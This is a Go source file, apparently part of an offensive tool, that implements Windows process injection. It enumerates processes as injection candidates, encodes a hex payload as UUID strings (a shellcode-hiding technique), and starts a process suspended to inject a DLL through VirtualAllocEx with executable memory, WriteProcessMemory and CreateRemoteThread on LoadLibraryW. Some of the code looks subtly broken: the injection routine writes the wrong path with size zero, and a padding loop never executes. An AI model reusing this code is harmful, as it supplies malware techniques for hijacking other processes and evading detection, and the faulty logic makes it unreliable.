package inject

import (
	"debug/pe"
	"encoding/hex"
	"fmt"
	"math/rand"
	"os"
	"syscall"
	"unicode/utf16"
	"unsafe"

	"github.com/gofrs/uuid"
	"golang.org/x/sys/windows"
)

const errSuccess string = "The operation completed successfully."

func SelectRandomElement(array []uint32) int {
	randomIndex := rand.Intn(len(array))
	chosen := array[randomIndex]
	return int(chosen)
}

func Get64BitProcesses() []uint32 {
	fmt.Printf("\n[+] Listing running processes")

	processes, cbNeeded := EnumProcesses()

	var candidates []uint32
	for i := 0; i < int(cbNeeded); i++ {
		pid := processes[i]
		if pid == 0 && i > 0 {
			break
		} else if pid != uint32(os.Getpid()) {
			bitness := Is64Bit(pid)
			if bitness == 0 {
				candidates = append(candidates, pid)
			}
		}
	}
	fmt.Printf("\n[+] Number of process injection candidates: %d", len(candidates))
	return candidates
}

func Is64Bit(pid uint32) int {

	pHandle, err := OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, 0, pid)

	if err.Error() == errSuccess {
		bitness := IsWow64Process(pHandle)
		CloseHandle(pHandle)
		return int(bitness)

	} else {
		CloseHandle(pHandle)
		return -1
	}
}

func StringToCharPtr(str string) *uint8 {
	chars := append([]byte(str), 0) // null terminated
	return &chars[0]
}

func StringToUTF16Ptr(str string) *uint16 {
	wchars := utf16.Encode([]rune(str + "\x00"))
	return &wchars[0]
}

// SplitToWords - Splits a slice into multiple slices based on word length.
func SplitToWords(array []byte, wordLen int, pad_incomplete bool) [][]byte {
	words := [][]byte{}
	for i := 0; i < len(array); i += wordLen {
		word := array[i : i+wordLen]

		if pad_incomplete && len(word) < wordLen {
			for j := len(word); j < len(word); j++ {
				word = append(word, 0)
			}
		}
		words = append(words, word)
	}
	return words
}

// SwapEndianness - Heavily inspired by code from CyberChef https://github.com/gchq/CyberChef/blob/c9d9730726dfa16a1c5f37024ba9c7ea9f37453d/src/core/operations/SwapEndianness.mjs
func SwapEndianness(array []byte, word_len int, pad_incomplete bool) []byte {

	// Split into words.
	words := SplitToWords(array, word_len, pad_incomplete)

	// Rejoin into single slice.
	result := []byte{}
	for i := 0; i < len(words); i++ {
		for k := len(words[i]) - 1; k >= 0; k-- {
			result = append(result, words[i][k])
		}
	}
	return result
}

// ConvertToUUIDS - converts a hex payload to a slice of UUID strings.
func ConvertToUUIDS(payload string) []string {

	uuids := []string{}

	sc, _ := hex.DecodeString(payload)

	for i := 0; i < len(sc); i += 16 {

		fmt.Println([]byte(sc)[i : i+16])

		leBytes1 := SwapEndianness([]byte(sc)[i:i+4], 4, false)
		leBytes2 := SwapEndianness([]byte(sc)[i+4:i+8], 4, false)

		fmt.Println(leBytes2)
		leBytes3 := append(leBytes2[2:4], leBytes2[0:2]...)

		leBytes := append(leBytes1, leBytes3...)
		leBytes = append(leBytes, []byte(sc)[i+8:i+16]...)
		fmt.Println(leBytes)

		uuid, err := uuid.FromBytes(leBytes)
		if err != nil {
			fmt.Println(err)
		}
		uuids = append(uuids, uuid.String())
	}

	return uuids
}

// findRelocSec
func findRelocSec(va uint32, secs []*pe.Section) *pe.Section {
	for _, sec := range secs {
		if sec.VirtualAddress == va {
			return sec
		}
	}
	return nil
}

func Log(format string, args ...interface{}) {
	fmt.Printf(format+"\n", args...)
}

func CreateProcess(srcPath string) *syscall.ProcessInformation {
	var si syscall.StartupInfo
	var pi syscall.ProcessInformation

	commandLine, err := syscall.UTF16PtrFromString(srcPath)

	if err != nil {
		panic(err)
	}

	err = syscall.CreateProcess(
		nil,
		commandLine,
		nil,
		nil,
		false,
		windows.CREATE_SUSPENDED,
		nil,
		nil,
		&si,
		&pi)

	if err != nil {
		panic(err)
	}

	return &pi
}

// srcPath aka Wow.exe, destPath aka injected dll
func RunHollow(srcPath, destPath string) {
	pi := CreateProcess(srcPath)

	pHandle := uintptr(pi.Process)
	tHandle := uintptr(pi.Thread)

	// Get context of thread.
	var ctx *CONTEXT
	var cbuf [unsafe.Sizeof(*ctx) + 15]byte
	ctx = (*CONTEXT)(unsafe.Pointer((uintptr(unsafe.Pointer(&cbuf[15]))) &^ 15))
	ctx.ContextFlags = CONTEXT_FULL

	err := GetThreadContext(tHandle, ctx)
	if err != nil && err.Error() != SUCCESS {
		fmt.Println(err)
	}

	loaderPathPtr := VirtualAllocEx(
		uintptr(pHandle),
		0,
		uint32(len(srcPath)*2),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)

	if loaderPathPtr == 0 {
		panic("[!]VirtualAllocEx failed and returned 0")
	}

	Log("New base address %x", loaderPathPtr)
	Log("Writing PE to memory in process at %x (size: %v)", loaderPathPtr, 0)
	WriteProcessMemory(pHandle, loaderPathPtr, []byte(srcPath), 0)

	loaderDLLPointer := GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryW")

	CreateRemoteThread(pHandle, uintptr(0), 0, loaderDLLPointer, loaderPathPtr, 0, 0)

	err = SetThreadContext(tHandle, *ctx)
	if err != nil && err.Error() != SUCCESS {
		fmt.Println(err)
	}

	err = ResumeThread(tHandle)
	if err != nil && err.Error() != SUCCESS {
		fmt.Println(err)
	}
}
